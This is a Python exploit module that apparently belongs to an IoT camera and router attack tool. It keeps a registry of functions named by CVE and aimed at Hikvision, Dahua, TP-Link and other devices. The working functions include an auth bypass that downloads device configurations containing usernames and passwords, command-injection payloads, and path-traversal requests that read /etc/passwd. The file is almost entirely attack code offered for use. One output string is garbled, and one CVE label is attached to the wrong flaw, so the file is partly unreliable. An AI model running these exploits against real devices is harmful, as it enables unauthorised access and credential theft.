import aiohttp
import logging
from rich.console import Console
import asyncio

console = Console()


async def exploit_cve_2017_7921(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/System/configurationFile?auth=YWRtaW46MTEK"
    console.print(f"[yellow]CVE-2017-7921 trying: {exploit_url}[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200:
                content = await response.read()
                if b"<userName>" in content and b"<password>" in content:
                    console.print("[bold green]VULNERABILITY SUCCESSFUL! Device configuration file downloaded.[/bold green]")
                    filename = f"CVE-2017-7921_{target_ip}.conf"
                    with open(filename, 'wb') as f:
                        f.write(content)
                    return f"Successful. The configuration file was saved as '{filename}'. Check the contents."
                else:
                    return "Failed. The server returned 200 OK but the expected content was not found."
            else:
                return f"Failed. The server returned {response.status} code."
    except Exception as e:
        logging.error(f"CVE-2017-7921 exploit error: {e}")
        return f"Error: {e}"



#hikvision exploits
async def exploit_cve_2021_36260(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/SDK/webLanguage"
    payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(id)</language>"
    headers = {'Content-Type': 'application/xml'}
    console.print(f"[yellow]CVE-2021-36260 trying: {exploit_url} (Command Execution)[/yellow]")
    try:
        
        async with session.put(exploit_url, data=payload, headers=headers, timeout=8, ssl=False) as response:
            
            if response.status == 200:
                 return "[bold green]THE VULNERABILITY IS PROBABLY SUCCESSFUL![/bold green] The server gave a 200 OK response. This means that the command is most likely running, but this exploit does not provide a direct output due to its nature."
            else:
                return f"Failed. Server returned {response.status} code."
    except asyncio.TimeoutError:
        return "[bold green]THE VULNERABILITY IS PROBABLY SUCCESSFUL![/bold green] The server did not respond (timed out), which is usually expected behavior when the command is executed."
    except Exception as e:
        logging.error(f"CVE-2021-36260 exploit error: {e}")
        return f"Error: {e}"





async def exploit_cve_2022_28173(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/arcsoft/static/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
    console.print(f"[yellow]CVE-2022-28173 trying: {exploit_url} (File Reading)[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200:
                content = await response.text()
                if "root:" in content:
                    console.print("[bold green]THE VULNERABILITY IS SUCCESSFUL! /etc/passwd file was read.[/bold green]")
                    filename = f"CVE-2022-28173_{target_ip}_passwd.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(content)
                    return f"Succesful. File '{filename}' saved."
                else:
                    return "Failed. The server returned 200 OK but the expected content ('root:') was not found."
            else:
                return f"Failed. The server returned {response.status} code."
    except Exception as e:
        logging.error(f"CVE-2022-28173 exploit error: {e}")
        return f"Error: {e}"


#dahua exploits
async def exploit_cve_2021_33044(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/SDK/../../../../../../../../../../../../etc/passwd"
    console.print(f"[yellow]CVE-2021-33044 trying: {exploit_url} (Path Traversal)[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200:
                content = await response.text()
                if "root:" in content or "admin:" in content:
                    console.print("[bold green]THE VULNERABILITY IS SUCCESSFUL! /etc/passwd file was read.[/bold green]")
                    filename = f"CVE-2021-33044_{target_ip}_passwd.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(content)
                    return f"Succesful. File '{filename}' saved."
                else:
                    return "Failed. The server returned 200 OK but the expected content was not found."
            else:
                return f"Failed. The server returned {response.status} code."
    except Exception as e:
        logging.error(f"CVE-2021-33044 exploit error: {e}")
        return f"Error: {e}"

async def exploit_cve_2021_33045(target_ip: str, port: int, session: aiohttp.ClientSession):
    console.print(f"[yellow]CVE-2021-33045 checking (Information).[/yellow]")
    return "This vulnerability (CVE-2021-33045) is related to accessing log files without authentication. There is no reliable method for an automated exploit because log file names are unpredictablevulnerability (CVE-2021-33045) is related to accessing log files without authentication. There is no reliable method for anmended."



#tp-link exploits
async def exploit_cve_2023_50387(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/"
    payload = {
        "method": "do",
        "cnid": "e9829a732ef158a1",
        "params": {
            "system": {
                "reboot": "; id"
            },
            "login": {
                "username": "",
                "password": ""
            }
        }
    }
    console.print(f"[yellow]CVE-2023-50387 trying: {exploit_url} (Command Execution)[/yellow]")
    try:
        async with session.post(exploit_url, json=payload, timeout=10, ssl=False) as response:
            if response.status == 200:
                 return "[bold green]THE VULNERABILITY IS PROBABLY SUCCESSFUL![/bold green] The server returned a 200 OK response. This means the command most likely worked, but does not provide any direct output."
            else:
                 return f"Failed. The server returned {response.status} code."
    except Exception as e:
        logging.error(f"CVE-2023-50387 exploit error: {e}")
        return f"Error: {e}"


async def exploit_cve_2022_4499(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/../../../../../../../../../../../../../../"
    console.print(f"[yellow]CVE-2022-4499 trying: {exploit_url} (Path Listing)[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200:
                content = await response.text()
                if "etc" in content and "bin" in content and "usr" in content:
                    console.print("[bold green]THE VULNERABILITY IS PROBABLY SUCCESSFUL! The root directory is listed.[/bold green]")
                    filename = f"CVE-2022-4499_{target_ip}_rootdir.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(content)
                    return f"Successful. The directory list was saved as '{filename}'."
                else:
                    return "Failed. The server returned 200 OK but the expected directories were not found."
            else:
                return f"Failed. The server returned {response.status} code."
    except Exception as e:
        logging.error(f"CVE-2022-4499 exploit error: {e}")
        return f"Error: {e}"

async def exploit_cve_2021_35517(target_ip: str, port: int, session: aiohttp.ClientSession):
    console.print(f"[cyan]An exploit for CVE-2021-35517 has not yet been implemented.[/cyan]")
    return "A function has been created for this exploit but it is not active yet."

async def exploit_cve_2020_25078(target_ip: str, port: int, session: aiohttp.ClientSession):
    console.print(f"[cyan]An exploit for CVE-2020-25078 has not yet been implemented.[/cyan]")
    return "A function has been created for this exploit but it is not active yet."

async def exploit_cve_2021_40045(target_ip: str, port: int, session: aiohttp.ClientSession):
    console.print(f"[cyan]An exploit for CVE-2021-40045 has not yet been implemented.[/cyan]")
    return "A function has been created for this exploit but it is not active yet."
    
async def exploit_cve_2021_40046(target_ip: str, port: int, session: aiohttp.ClientSession):
    console.print(f"[cyan]An exploit for CVE-2021-40046 has not yet been implemented.[/cyan]")
    return "A function has been created for this exploit but it is not active yet."



EXPLOIT_REGISTRY = {
    "CVE-2017-7921": exploit_cve_2017_7921,
    
    #hikvision
    "CVE-2021-36260": exploit_cve_2021_36260,
    "CVE-2022-28173": exploit_cve_2022_28173,
    
    #dahua
    "CVE-2021-33044": exploit_cve_2021_33044,
    "CVE-2021-33045": exploit_cve_2021_33045, 
    
    #tp-link
    "CVE-2023-50387": exploit_cve_2023_50387,
    "CVE-2022-4499": exploit_cve_2022_4499,
    
    #uniview
    "CVE-2021-35517": exploit_cve_2021_35517,
    "CVE-2020-25078": exploit_cve_2020_25078,

    #reolink
    "CVE-2021-40045": exploit_cve_2021_40045,
    "CVE-2021-40046": exploit_cve_2021_40046,
    
    #new exploits
    # "CVE-XXXX-YYYY": exploit_function_name,
}
